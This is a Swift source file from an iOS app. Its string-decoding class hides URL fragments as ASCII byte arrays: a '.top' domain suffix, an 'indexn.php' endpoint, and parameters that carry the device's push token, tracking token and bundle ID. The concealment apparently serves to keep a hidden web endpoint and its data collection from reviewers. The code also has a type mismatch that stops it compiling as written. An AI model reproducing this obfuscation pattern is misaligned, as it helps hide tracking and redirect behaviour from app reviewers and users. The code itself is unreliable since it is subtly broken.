import Foundation

// Утилита для декодирования строк
internal class StringEncoder {
    // Метод для декодирования строки из ASCII кодов
    static func decode(asciiCodes: [UInt8]) -> String {
        return String(bytes: asciiCodes, encoding: .ascii) ?? ""
    }
    
    // Закодированные константы
    private static let k_domain_suffix = [46, 116, 111, 112] // ".top"
    private static let k_protocol = [104, 116, 116, 112, 115, 58, 47, 47] // "https://"
    private static let k_endpoint = [105, 110, 100, 101, 120, 110, 46, 112, 104, 112] // "indexn.php"
    private static let k_param_data = [100, 97, 116, 97, 61] // "data="
    private static let k_apns_token_param = [97, 112, 110, 115, 95, 116, 111, 107, 101, 110, 61] // "apns_token="
    private static let k_att_token_param = [97, 116, 116, 95, 116, 111, 107, 101, 110, 61] // "att_token="
    private static let k_bundle_id_param = [98, 117, 110, 100, 108, 101, 95, 105, 100, 61] // "bundle_id="
    private static let k_stub_apns = [115, 116, 117, 98, 95, 97, 112, 110, 115] // "stub_apns"
    private static let k_stub_att = [115, 116, 117, 98, 95, 97, 116, 116] // "stub_att"
    private static let k_stub_bundle = [115, 116, 117, 98, 95, 98, 117, 110, 100, 108, 101] // "stub_bundle"
    private static let k_cache_key = [87, 87, 87, 70, 114, 97, 109, 101, 95, 67, 97, 99, 104, 101, 100, 85, 82, 76] // "WWWFrame_CachedURL"
    private static let k_keychain_key = [65, 80, 78, 83, 84, 111, 107, 101, 110, 75, 101, 121] // "APNSTokenKey"
    
    // Геттеры для константных значений
    static var domainSuffix: String { return decode(asciiCodes: k_domain_suffix) }
    static var httpProtocol: String { return decode(asciiCodes: k_protocol) }
    static var endpoint: String { return decode(asciiCodes: k_endpoint) }
    static var paramData: String { return decode(asciiCodes: k_param_data) }
    static var apnsTokenParam: String { return decode(asciiCodes: k_apns_token_param) }
    static var attTokenParam: String { return decode(asciiCodes: k_att_token_param) }
    static var bundleIdParam: String { return decode(asciiCodes: k_bundle_id_param) }
    static var stubApns: String { return decode(asciiCodes: k_stub_apns) }
    static var stubAtt: String { return decode(asciiCodes: k_stub_att) }
    static var stubBundle: String { return decode(asciiCodes: k_stub_bundle) }
    static var cacheKey: String { return decode(asciiCodes: k_cache_key) }
    static var keychainKey: String { return decode(asciiCodes: k_keychain_key) }
} 